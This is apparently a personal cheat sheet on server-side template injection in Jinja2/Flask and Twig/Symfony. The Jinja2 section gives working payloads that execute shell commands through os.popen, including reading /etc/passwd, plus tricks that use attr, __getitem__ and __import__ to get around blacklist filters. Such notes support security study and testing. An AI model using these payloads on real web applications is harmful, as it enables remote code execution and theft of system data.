## Jinja2 (Flask)
If you can make flask parse text (for example by inclusion or pasting before parsing) you decide.
Note that Flask templates are actually Jinja2 templates.
### Running code
You can run code using `{{code}}`, will replace with the output (for example `{{1+1}}` is 2).
Running command:
`{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /etc/passwd').read()}}`
In general it's very similar to no builtins jail escape. TODO details on how it works.
#### Bypassing limitations
- You can replace `a.b` with `a|attr('b')`, so you can encode characters inside strings and avoid blacklists. Make sure to put in parenthesis, I am unsure when is it needed. Example without dots: `{{(((((self|attr('_TemplateReference__context')).cycler)|attr('__init__'))|attr('__globals__')).os.popen('ls')).read()}}`
- You can replace indexed access in array and dictionary (`a[b]`) with `a.__getitem__(b)`
- In case there's no `os`, you can import it by accessing `__import__` and calling `os` instead of `os` directly, like the following: `self._TemplateReference__context.cycler.__init__.__globals__['__builtins__']['__import__']('os').popen('cat /etc/passwd').read()`
-  https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f TODO expend here
### Full Reference
https://jinja.palletsprojects.com/en/stable/templates/
## Twig (symfony)
When calling `createTemplate` on user string in symfony.
### Accessing Variables.
You can access variables using `{{expression}}`, this doesn't run code but use specialized twig syntax.
Tips:
- You can output an object using `|json_encode`
- You can output an array using `|json_encode` or `|join(',')`
- You can access the current context (available variables) in `_context`
Reference is in https://twig.symfony.com/doc/3.x/templates.html#variables
### Playground
https://twig.symfony.com/play
### Full reference
https://twig.symfony.com/doc/3.x/